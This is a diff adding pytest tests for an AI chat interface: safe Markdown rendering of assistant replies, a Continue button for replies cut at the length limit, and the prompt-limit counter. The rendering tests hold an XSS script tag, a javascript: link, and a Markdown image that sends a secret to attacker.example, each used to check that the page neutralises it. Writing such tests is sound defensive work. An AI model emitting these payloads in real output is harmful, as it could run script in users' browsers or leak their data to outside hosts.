@@ -12,8 +12,10 @@ Malformed or missing conversation ids return to the canonical empty chat URL.
 from __future__ import annotations
 
 import html
+import json
 import os
 import re
+import uuid
 
 os.environ.setdefault("ALLOW_INSECURE_JWT", "true")
 
@@ -235,6 +237,116 @@ async def test_chat_returns_user_and_assistant_bubbles(ui_client):
     assert "Here is your summary." in r.text
     assert "ai-msg--error" not in r.text
     assert r.headers["HX-Push-Url"] == "/ai?conversation=conv-1"
+
+
+_MARKDOWN_REPLY = (
+    "**Totals** by month:\n\n"
+    "| Month | Amount |\n|---|---:|\n| Oct | 1,200.00 |\n\n"
+    "<script>alert(1)</script> [open](javascript:alert(1)) [help](/help/items)"
+)
+
+
+async def _ask(ui_client, answer: str, query: str = "summarize") -> str:
+    result = {"answer": answer, "model_used": "m", "tools_called": [], "pending_actions": []}
+    ui_client.cookies.update(_authed())
+    with patch("celerp_ai.ui_routes.api.ai_conversation_query", AsyncMock(return_value=result)):
+        r = await ui_client.post("/ai/chat", data={"query": query, "conversation_id": "conv-1"})
+    assert r.status_code == 200
+    return r.text
+
+
+@pytest.mark.asyncio
+async def test_reply_markdown_renders_tables_and_emphasis_with_raw_html_and_scripts_inert(ui_client):
+    """A reply's Markdown table and bold render as a table and bold; raw HTML in the
+    reply shows as text and a javascript: link is not a link."""
+    page = await _ask(ui_client, _MARKDOWN_REPLY)
+    reply = page[page.index("ai-msg--ai"):]
+    assert "<table" in reply and "<th>Month</th>" in reply
+    assert '<td style="text-align:right">1,200.00</td>' in reply
+    assert "<strong>Totals</strong>" in reply
+    assert "<script>" not in reply and "&lt;script&gt;" in reply
+    assert 'href="javascript' not in reply
+    assert 'href="/help/items"' in reply
+    assert "| Month |" not in reply and "**Totals**" not in reply
+
+
+@pytest.mark.asyncio
+async def test_reply_markdown_never_loads_an_image(ui_client):
+    """A reply cannot make the browser fetch anything: Markdown image syntax shows as
+    text, never as an image, while a link stays a link the user chooses to click."""
+    page = await _ask(ui_client, "![s](https://attacker.example/p.png?d=SECRET) and "
+                                 "[doc](https://example.com/a)\n\n![local](/static/x.png)")
+    reply = page[page.index("ai-msg--ai"):]
+    assert "<img" not in reply and "src=" not in reply
+    assert 'href="https://example.com/a"' in reply
+
+
+def _continue_button(page: str) -> str | None:
+    found = re.search(r'<button[^>]*ai-msg__continue[^>]*>', page)
+    return html.unescape(found.group(0)) if found else None
+
+
+@pytest.mark.asyncio
+async def test_a_cut_reply_says_so_and_offers_continue_through_the_chat_send(ui_client):
+    """A reply the service cut at the length limit carries a notice and a Continue button
+    that asks the assistant to carry on through the chat's own send, as a new question in
+    the same conversation; a whole reply carries neither."""
+    result = {"answer": "The first half", "model_used": "m", "tools_called": [], "pending_actions": []}
+    ui_client.cookies.update(_authed())
+    pages = {}
+    for cut in (True, False):
+        with patch("celerp_ai.ui_routes.api.ai_conversation_query", AsyncMock(return_value={**result, "cut": cut})):
+            r = await ui_client.post("/ai/chat", data={"query": "summarize", "conversation_id": "conv-1"})
+        assert r.status_code == 200
+        pages[cut] = r.text
+    assert t("ai.reply_cut") in pages[True]
+    button = _continue_button(pages[True])
+    assert 'hx-post="/ai/chat"' in button and 'hx-target="#ai-messages"' in button
+    sent = json.loads(re.search(r"hx-vals='([^']*)'", button).group(1))
+    assert sent["query"] == t("ai.continue_request") and sent["conversation_id"] == "conv-1"
+    assert uuid.UUID(sent["operation_id"])
+    assert t("ai.reply_cut") not in pages[False] and _continue_button(pages[False]) is None
+
+
+def test_a_cut_reply_in_the_thread_keeps_its_notice_and_only_the_last_offers_continue():
+    """Reopened, a cut reply still says it was cut. Continue carries on from the end of
+    the conversation, so only its last reply offers it."""
+    from celerp_ai.ui_routes import _message_parts
+    entry = {"id": "m1", "role": "assistant", "content": "The first half", "cut": True}
+    last = to_xml(_message_parts(entry, "conv-1", None, "en", offer_again=True)[0])
+    older = to_xml(_message_parts(entry, "conv-1", None, "en", offer_again=False)[0])
+    assert t("ai.reply_cut") in last and _continue_button(last) is not None
+    assert t("ai.reply_cut") in older and _continue_button(older) is None
+    whole = to_xml(_message_parts({**entry, "cut": False}, "conv-1", None, "en", offer_again=True)[0])
+    assert t("ai.reply_cut") not in whole and _continue_button(whole) is None
+
+
+@pytest.mark.asyncio
+async def test_composer_shows_the_prompt_limit_the_api_enforces(ui_client):
+    """The composer counts the prompt against the limit the API refuses past, and does
+    not cut a paste short: the text is kept and the refusal names the limit."""
+    from celerp_ai.routes import MAX_PROMPT_CHARS
+    patches = _patch_page()
+    _apply(patches)
+    ui_client.cookies.update(_authed())
+    try:
+        r = await ui_client.get("/ai")
+    finally:
+        _stop(patches)
+    field = re.search(r'<textarea[^>]*id="ai-query-input"[^>]*>', r.text).group(0)
+    assert "maxlength" not in field
+    count = re.search(r'<[^>]*id="ai-query-count"[^>]*>', r.text).group(0)
+    assert f'data-limit="{MAX_PROMPT_CHARS}"' in count
+
+
+@pytest.mark.asyncio
+async def test_user_question_shows_as_typed_not_as_markdown(ui_client):
+    """Only the assistant's reply is Markdown: the question bubble shows the user's
+    characters as typed."""
+    page = await _ask(ui_client, "ok", query="**why** <b>this</b>")
+    question = page[page.index("ai-msg--user"):page.index("ai-msg--ai")]
+    assert "**why** &lt;b&gt;this&lt;/b&gt;" in question
+    assert "<strong>" not in question
 
 
 @pytest.mark.asyncio
